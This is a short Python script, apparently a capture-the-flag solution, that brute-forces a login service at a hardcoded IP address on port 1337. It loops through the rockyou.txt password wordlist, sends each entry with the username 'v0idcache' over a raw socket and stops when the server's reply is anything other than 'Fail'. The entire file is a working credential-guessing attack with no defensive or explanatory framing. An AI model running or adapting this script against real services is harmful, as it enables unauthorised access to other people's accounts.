import socket

def brute_force():
    host = "142.93.136.81"
    port = 1337
    wordlist = 'rockyou.txt'
    username = "v0idcache"   # Hint: use OSINT
    password = ""   # Hint: use wordlist
    data = ""

#    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    fo = open(wordlist, "r")

    #s.connect((host, port))
    #data = s.recv(1024)
    for line in fo:
        password = line
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(1024)
        
        s.send(username + "\n")
        data = s.recv(1024)

        s.send(password + "\n")

        data = s.recv(1024)

        if data != "Fail\n":
            print(data)
            print("the password is: " + password)
            break
        #else:
            #print(password + ": failed\n")

        s.close()
    
    print("you got to the end")





if __name__ == '__main__':
    brute_force()
